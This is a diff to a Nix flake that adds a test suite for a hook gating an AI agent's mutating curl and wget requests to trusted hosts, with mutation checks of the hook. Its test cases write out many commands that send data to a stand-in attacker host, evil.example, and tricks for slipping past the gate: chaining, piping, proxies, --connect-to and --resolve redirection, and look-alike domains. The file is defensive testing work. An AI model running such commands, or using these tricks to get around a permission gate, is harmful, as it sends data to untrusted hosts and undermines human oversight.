@@ -4,7 +4,7 @@
 # so a check can drive the same file directly: feed it a hook JSON payload on
 # stdin and assert whether it emits an "ask" decision or exits silently to fall
 # through to the blanket Bash allow.
-{ ... }:
+{ config, ... }:
 {
   perSystem =
     { pkgs, system, ... }:
@@ -17,12 +17,22 @@
           x86_64-linux = {
             # nixbot: median 7.3 s, slowest 19 s, all 9 runs 2026-08-29..2026-10-21
             hook-gate-dangerous-commands.class = "small";
+            # nixbot: 0 runs, too few to class (design D4)
+            hook-gate-mutating-http = {
+              class = "medium";
+              measured = false;
+            };
             # nixbot: median 3.0 s, slowest 80 s, 66 runs in 30 days
             updater-repository-paths.class = "small";
           };
           aarch64-darwin = {
             # nixbot: median 33 s, slowest 39 s, 3 runs in 30 days
             hook-gate-dangerous-commands.class = "small";
+            # nixbot: 0 runs, too few to class (design D4)
+            hook-gate-mutating-http = {
+              class = "medium";
+              measured = false;
+            };
             # nixbot: median 14 s, slowest 358 s, 69 runs in 30 days
             updater-repository-paths.class = "small";
           };
@@ -237,6 +247,180 @@
               exit 1
             fi
 
+            touch $out
+          '';
+
+      # gate-mutating-http, driven as the home module renders it, trusted hosts
+      # filled in (flake.lib.gateMutatingHttpScript), with notify-permission-wait
+      # replaced by a stub that records its call, so nothing is sent. A mutating
+      # request is allowed only when every request in the command goes to a
+      # trusted host; anything the hook cannot read from the text asks.
+      checks.hook-gate-mutating-http =
+        let
+          # Each case is "<expected> <command>": allow or ask is the hook's JSON
+          # decision, pass is a silent exit for a command that is not curl or wget.
+          cases = [
+            # One request to a trusted host, in the forms agents use.
+            "allow curl -d hi https://ntfy.vanixiets.internal/probe-x"
+            "allow curl -d hi https://ntfy.zt/probe-x"
+            "allow curl -X POST -d hi ntfy.zt/probe-x"
+            "allow curl -sf -m 5 -H 'Title: t' -H \"Priority: high\" -d \"done; all green\" https://ntfy.vanixiets.internal/probe-x"
+            "allow curl -sSf --cacert /etc/ssl/root.crt -H @- -d hi https://ntfy.zt:443/probe-x"
+            "allow curl --request PUT -T notes.txt https://ntfy.zt/probe-x"
+            "allow curl -d hi --url https://ntfy.vanixiets.internal/probe-x"
+            "allow curl -dhi https://ntfy.zt/probe-x"
+            "allow curl -d hi https://ntfy.zt/probe-x https://ntfy.vanixiets.internal/probe-y"
+            # Untrusted or look-alike hosts.
+            "ask curl -d hi https://other.vanixiets.internal/x"
+            "ask curl -d hi https://ntfy.vanixiets.internal.evil.example/x"
+            "ask curl -d hi https://ntfy.zt./probe-x"
+            "ask curl -d hi https://NTFY.ZT/probe-x"
+            "ask curl -d hi https://ntfy.ｚｔ/probe-x"
+            "ask curl -d hi https://xn--ntfy-zt.example/probe-x"
+            # Two requests, trusted then untrusted, in each joining form.
+            "ask curl -d hi https://ntfy.zt/probe-x https://evil.example/x"
+            "ask curl -d hi https://ntfy.zt/probe-x --next -d hi https://evil.example/x"
+            "ask curl -d hi https://ntfy.zt/probe-x -: -d hi https://evil.example/x"
+            "ask curl -d hi https://ntfy.zt/probe-x; curl -d hi https://evil.example/x"
+            "ask curl -d hi https://ntfy.zt/probe-x && curl -d hi https://evil.example/x"
+            "ask curl -d hi https://ntfy.zt/probe-x || curl -d hi https://evil.example/x"
+            "ask curl -d hi https://ntfy.zt/probe-x | curl -d @- https://evil.example/x"
+            "ask (curl -d hi https://ntfy.zt/probe-x; curl -d hi https://evil.example/x)"
+            "ask curl -d hi https://ntfy.zt/probe-x & curl -d hi https://evil.example/x"
+            "ask echo https://evil.example/x | xargs curl -d hi https://ntfy.zt/probe-x"
+            "ask for u in https://ntfy.zt/probe-x https://evil.example/x; do curl -d hi \"$u\"; done"
+            "ask curl -d hi https://ntfy.zt/probe-x\ncurl -d hi https://evil.example/x"
+            "ask curl -d hi --url https://evil.example/x https://ntfy.zt/probe-x"
+            "ask curl -d hi 'https://{ntfy.zt,evil.example}/x'"
+            # A destination the text does not name.
+            "ask curl -d hi \"$NTFY_URL/probe-x\""
+            "ask curl -d hi $(cat url)"
+            "ask curl -d hi `cat url`"
+            "ask curl -K request.cfg -d hi https://ntfy.zt/probe-x"
+            "ask curl --config request.cfg -d hi https://ntfy.zt/probe-x"
+            "ask curl -d hi"
+            # The URL names a trusted host but the bytes go elsewhere.
+            "ask curl --connect-to ntfy.zt:443:evil.example:443 -d hi https://ntfy.zt/probe-x"
+            "ask curl --resolve ntfy.zt:443:203.0.113.9 -d hi https://ntfy.zt/probe-x"
+            "ask curl -x http://evil.example:3128 -d hi https://ntfy.zt/probe-x"
+            "ask curl --proxy http://evil.example:3128 -d hi https://ntfy.zt/probe-x"
+            "ask curl -L -d hi https://ntfy.zt/probe-x"
+            "ask curl -sLd hi https://ntfy.zt/probe-x"
+            "ask curl --unix-socket /tmp/s -d hi https://ntfy.zt/probe-x"
+            "ask https_proxy=http://evil.example:3128 curl -d hi https://ntfy.zt/probe-x"
+            # The trusted name only in a header, data, query or userinfo.
+            "ask curl -H 'Host: ntfy.zt' -d hi https://evil.example/x"
+            "ask curl -d https://ntfy.zt/probe-x https://evil.example/x"
+            "ask curl -d hi 'https://evil.example/?u=https://ntfy.zt/'"
+            "ask curl -d hi https://evil.example/ntfy.zt/x"
+            "ask curl -d hi https://ntfy.zt@evil.example/"
+            "ask curl -d hi https://user:pw@ntfy.zt/probe-x"
+            # An option the hook does not know may take the next word, so asks.
+            "ask curl --frobnicate -d hi https://ntfy.zt/probe-x"
+            # wget follows redirects by default, so its mutations always ask.
+            "ask wget --post-data=hi https://ntfy.zt/probe-x"
+            # Unchanged: requests that do not mutate, and commands that are not curl or wget.
+            "allow curl -s https://evil.example/x"
+            "allow curl -s https://ntfy.zt/v1/health; curl -s https://evil.example/x"
+            "ask curl -d hi https://evil.example/x"
+            # A data, form, upload or method flag inside a short-option cluster
+            # still makes the request mutating.
+            "ask curl -sd hi https://evil.example/x"
+            "ask curl -dhi https://evil.example/x"
+            "ask curl -sF a=b https://evil.example/x"
+            "ask curl -sXPOST https://evil.example/x"
+            "pass ntfy-send \"probe\" probe-x"
+          ];
+        in
+        pkgs.runCommand "hook-gate-mutating-http"
+          {
+            nativeBuildInputs = [
+              pkgs.jq
+              pkgs.gnugrep
+            ];
+            hook = pkgs.writeText "gate-mutating-http" config.flake.lib.gateMutatingHttpScript;
+            # One JSON payload per line, so a case may hold a newline.
+            caseFile = pkgs.writeText "gate-mutating-http-cases" (
+              builtins.concatStringsSep "\n" (
+                map (
+                  case:
+                  let
+                    expected = builtins.head (builtins.split " " case);
+                  in
+                  builtins.toJSON {
+                    inherit expected;
+                    command = builtins.substring (builtins.stringLength expected + 1) (builtins.stringLength case) case;
+                  }
+                ) cases
+              )
+              + "\n"
+            );
+          }
+          ''
+            set -uo pipefail
+            stub=$(mktemp -d)
+            printf '#!%s\nprintf "%%s\\n" "$*" >> %s/notified\n' "$(command -v bash)" "$stub" > "$stub/notify-permission-wait"
+            chmod +x "$stub/notify-permission-wait"
+            export PATH="$stub:$PATH"
+
+            # cases HOOK: runs every case against HOOK, prints each failure and
+            # returns the number of failures.
+            cases() {
+              local hook=$1 failures=0 line expected command output status actual
+              while IFS= read -r line; do
+                expected=$(jq -r .expected <<< "$line")
+                command=$(jq -r .command <<< "$line")
+                status=0
+                output=$(jq -c '{tool_input: {command: .command}}' <<< "$line" | bash "$hook" 2>/dev/null) || status=$?
+                # Classify the hook's behaviour on its own terms, then compare.
+                actual=error
+                if [ "$status" -eq 0 ]; then
+                  if [ -z "$output" ]; then
+                    actual=pass
+                  else
+                    actual=$(jq -er '.hookSpecificOutput.permissionDecision | select(. == "ask" or . == "allow")' <<< "$output") || actual=error
+                  fi
+                fi
+                if [ "$actual" != "$expected" ]; then
+                  echo "FAIL: expected $expected, got $actual for: $command"
+                  failures=$((failures + 1))
+                fi
+              done < "$caseFile"
+              return "$failures"
+            }
+
+            cases "$hook"
+            failures=$?
+            if [ "$failures" -ne 0 ]; then
+              echo "$failures gate-mutating-http case(s) failed" >&2
+              exit 1
+            fi
+            echo "ok: every gate-mutating-http case"
+
+            # mutant NAME EXPECTED: runs the cases against ./NAME, which must fail
+            # them, among its failures the case whose command contains EXPECTED.
+            mutant() {
+              local found
+              if found=$(cases "$1"); then echo "FAIL: mutant $1 passed every case"; exit 1; fi
+              grep -qF -- "$2" <<< "$found" || { echo "FAIL: mutant $1 did not fail on $2: $found"; exit 1; }
+              echo "mutant $1 rejected, $(grep -c '^FAIL' <<< "$found") case(s) failing, among them:"
+              grep -F -- "$2" <<< "$found" | sed 's/^/  /'
+            }
+
+            # wholeCommand: the trusted names matched anywhere in the command,
+            # as before this rule, so the two-request cases are allowed.
+            cat > whole.sh <<'SH'
+            if [ -n "$REASON" ] && echo "$COMMAND" | grep -qE "(https?://|[[:space:]])($(echo $TRUSTED_HOSTS | sed 's/\./\\./g; s/ /|/g'))(/|:|[[:space:]]|$)"; then
+            SH
+            substitute "$hook" wholeCommand \
+              --replace-fail 'if [ -n "$REASON" ] && trusted_request "$COMMAND"; then' "$(cat whole.sh)"
+            mutant wholeCommand 'curl -d hi https://ntfy.zt/probe-x && curl -d hi https://evil.example/x'
+
+            # connectToKnown: --connect-to read as an ordinary option with a value.
+            substitute "$hook" connectToKnown \
+              --replace-fail '--next | --config | --connect-to | --resolve' '--next | --config | --resolve' \
+              --replace-fail '--data | --data-raw |' '--connect-to | --data | --data-raw |'
+            mutant connectToKnown 'curl --connect-to ntfy.zt:443:evil.example:443'
             touch $out
           '';
     };
